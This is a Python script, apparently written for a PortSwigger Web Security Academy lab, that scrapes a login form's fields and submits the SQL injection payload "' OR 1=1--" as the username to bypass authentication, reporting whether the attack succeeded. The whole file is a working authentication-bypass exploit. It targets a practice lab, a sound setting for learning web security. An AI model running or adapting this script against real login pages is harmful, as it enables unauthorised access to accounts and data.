from io import BytesIO
from lxml import etree

import requests

URL = 'https://0a4d00c703cca74981831b72009900cd.web-security-academy.net/login'
PAYLOAD = '\' OR 1=1--'
#HEADERS = {'User-Agent': 'Mozilla/5.0'}
TIMEOUT = 10

def inject_payload(url, payload):
    session = requests.Session()
    response = session.get(URL)
    params = get_params(response.content)
    params['username'] = payload
    params['password'] = 'test'

    result = session.post(url, data=params, timeout=TIMEOUT)
    print(f'{result.url} -> {result.status_code}')

    if result.status_code == requests.codes.ok:
        print('Attack was successful')
    else:
        print(f'Error Message: {result.text}')
        print(f'Submitted Headers: {result.request.headers}')
        print(f'Payload: {result.request.body}')

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for input_elem in tree.findall('.//input'):
        name = input_elem.get('name')

        if name is not None:
            params[name] = input_elem.get('value', None)
    
    return params

inject_payload(URL, PAYLOAD)